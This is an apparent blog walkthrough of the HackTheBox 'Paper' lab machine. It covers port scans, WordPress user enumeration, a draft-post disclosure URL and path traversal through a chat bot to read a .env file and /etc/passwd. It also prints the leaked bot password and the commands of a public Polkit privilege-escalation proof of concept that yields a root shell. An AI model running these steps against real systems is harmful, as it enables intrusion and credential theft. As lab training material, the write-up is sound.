---
title: "HackTheBox - Paper"
date: 2026-02-28T16:22:22-05:00
draft: false
tags: ["htb", "walkthrough", "paper"]
categories: ["HackTheBox"]
author: "BigKahunaBurger87"
---
## Host Info
IP = <span style="color:red"> 10.10.11.143</span>
Hostname = <span style="color:red"> paper.htb</span>
OS = <span style="color:red"> OS</span>
Kali _tun0_ = <span style="color:blue"> 10.10.14.7</span>

------------------------------------------------------
Workflow

Nmap Scan:
```bash
nmap -p- -Pn -T5 -oA /home/kali/Desktop/HTB/Boxes/NAME/nmap/nmap.alltcp $IP
```

Nmap Scan Results:
```bash
Nmap scan report for 10.10.11.143
Host is up (0.023s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

```

Nmap Port sort:
```bash
cat nmap.alltcp.nmap | grep open | awk -F " " '{ print $1 }' | awk -F "/" '{ print $1 }' > tcp.ports
```

Nmap Version Scan:
```bash
nmap -sC -sV -Pn -p $(tr '\n' , < tcp.ports) -oA nmap.nmap $IP
```

Nmap Version Scan Results:
```bash
Nmap scan report for 10.10.11.143
Host is up (0.019s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 ******************************** (RSA)
|   256 ******************************** (ECDSA)
|_  256 ******************************** (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
```

------------------------------------------
Gobuster Scan(if 443 add https, -k ):
```bash
gobuster dir -u http://10.10.10.84 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 -x asmx,aspx,asp,txt,pdf,php,cgi-bin
```

Gobuster Scan Results:
```bash

```

--------------------------

Nikto Scan:
```bash
nikto -host=http://$IP
```

Nikto Scan Results:
```bash

```

--------------------------------

Browse with BurpSuite

After browsing to the site on 80 and 443 we checked what Burp was doing and ID'd a backend host:
![Pasted image 20230222025257.png](/images/htb-paper/Pasted image 20230222025257.png)

After adding it to the /etc/hosts file:

We get a home page powered by WordPress
![Pasted image 20230222025453.png](/images/htb-paper/Pasted image 20230222025453.png)

After running wpscan for users and plugins we find 3 users

```bash
[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

We find a login at wp-admin
![Pasted image 20230222025849.png](/images/htb-paper/Pasted image 20230222025849.png)


After research a cve we find a vuln
https://wpscan.com/vulnerability/9909

![Pasted image 20230222030207.png](/images/htb-paper/Pasted image 20230222030207.png)

After trying the attempt as is we took off the&order part and was able to dump alot of good info.
```bash
http://office.paper/?static=1
```

![Pasted image 20230222030344.png](/images/htb-paper/Pasted image 20230222030344.png)

```bash
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

Next add chat.office.paper to /etc/hosts

chat.office.paper
![Pasted image 20230222030635.png](/images/htb-paper/Pasted image 20230222030635.png)

Next we will try the registration link:
```bash
http://chat.office.paper/register/8qozr226AhkCHZdyY
```



After Registering we get a chat message:
![Pasted image 20230222205228.png](/images/htb-paper/Pasted image 20230222205228.png)

Tells you which commands can be asked or ran
```bash
recyclops help
```

Run list:
```bash
list  
list sale  
list sale_2
```

Now we can list other directorys
```bash 
list ..
```

![Pasted image 20230222205421.png](/images/htb-paper/Pasted image 20230222205421.png)

This was successful and the output shows what appears to be the home directory of a user called dwight.

Looking around, we can see the directory of the bot called hubot . A quick Google search using the  
keywords rocketchat hubot password file shows a github page where we can see that the hubot  
configuration is stored in a file called .env
![Pasted image 20230222205557.png](/images/htb-paper/Pasted image 20230222205557.png)

Try to find credentials  for Rocket Chat
```bash
list ../hubot
```

![Pasted image 20230222205625.png](/images/htb-paper/Pasted image 20230222205625.png)

Let us view the contents of the /hubot/.env file using the file command
```bash
file ../hubot/.env
```

![Pasted image 20230222205807.png](/images/htb-paper/Pasted image 20230222205807.png)


```bash
PASSWORD = Queenofblad3s!23
```

Lets check what users are on the system
```bash
file ../../../etc.passwd
```
![Pasted image 20230222205933.png](/images/htb-paper/Pasted image 20230222205933.png)

Now lets try to ssh into both users with the poassword we found

![Pasted image 20230222205959.png](/images/htb-paper/Pasted image 20230222205959.png)

Next we servied Linpeas.sh and found that the machine is vulnerable to PolkIt:

We then put on the POC from:
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

```bash
chmod +x poc.sh
./poc.sh          THIS MAY TAKE SEVERAL TRIES
su - secnigma
secnigmaftw

[secnigma@paper ~]$ sudo /bin/bash
[sudo] password for secnigma: 

[root@paper secnigma]# 

[root@paper secnigma]# id
uid=0(root) gid=0(root) groups=0(root)

[root@paper secnigma]# cat /home/dwight/user.txt 
********************************

[root@paper secnigma]# cat /root/root.txt
********************************



```

![Pasted image 20230222205113.png](/images/htb-paper/Pasted image 20230222205113.png)
